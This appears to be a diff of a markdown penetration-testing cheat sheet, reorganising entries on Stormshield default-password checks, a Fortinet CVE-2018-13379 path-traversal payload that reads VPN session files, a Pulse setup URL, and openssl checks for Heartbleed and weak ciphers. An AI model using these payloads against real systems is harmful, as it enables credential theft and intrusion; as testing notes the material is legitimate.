@@ -155,11 +155,12 @@ run script post-merge https://docs.gitlab.com/ee/administration/custom_hooks.htm
 
 ## **Stormshield**
 
-* TCP PORT 1300
+- [test for default password](https://github.com/jenaye/netasq-1300)
 
 [Stormshield Documentation](https://documentation.stormshield.eu/SNS/v3/fr/Content/CLI_Serverd_Commands_reference_Guide_v3/Introduction.htm)
-```text
-Check default password : \(UpdatePasswd=1 if factory password, 0 if the password already have been changed\) CHPWD 101 code=00a01000 msg="Begin" format="section" \[Result\] UpdatePasswd=0
+```sh
+# Check default password : \(UpdatePasswd=1 if factory password, 0 if the password already have been changed\) 
+CHPWD 101 code=00a01000 msg="Begin" format="section" \[Result\] UpdatePasswd=0
 ```
 
 ---
@@ -169,36 +170,22 @@ Check default password : \(UpdatePasswd=1 if factory password, 0 if the password
 - [CVE-2018-13379](https://www.exploit-db.com/exploits/47288)
 
  ```bash
- curl -x GET <target>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
  ```
 
 ---
 
 ## **Dana**
 
-* [https://XXXX/dana-na/setup/psalinstall.cgi](https://XXXX/dana-na/setup/psalinstall.cgi)
-
----
-
-## **GPG decode**
-
 ```bash
-gpg --decrypt Test.zip.gpg > test.zip ( popup password )
+https://XXXX/dana-na/setup/psalinstall.cgi
 ```
-
----
 
 ## **SSL / TLS**
 
 * [testssh.sh](https://github.com/drwetter/testssl.sh)
 
-check Heartbleed
-
-```bash
-cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
-```
-
-Openssl
+### Openssl
 
 ```bash
 openssl s_client -cipher BEAST -connect <target>:443
@@ -206,6 +193,12 @@ openssl s_client -connect <target>:443 -ssl3
 
 # Expiration date
 openssl s_client -connect <target>:443 | openssl x509 -noout -dates
+```
+
+check Heartbleed
+
+```bash
+cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
 ```
 
 check lucky13
@@ -228,7 +221,7 @@ ssh-keygen -l -f key.pub
 
 ## **Android**
 
-`Apktool`
+Apktool
 
 ```bash
 apktool d app_name.apk
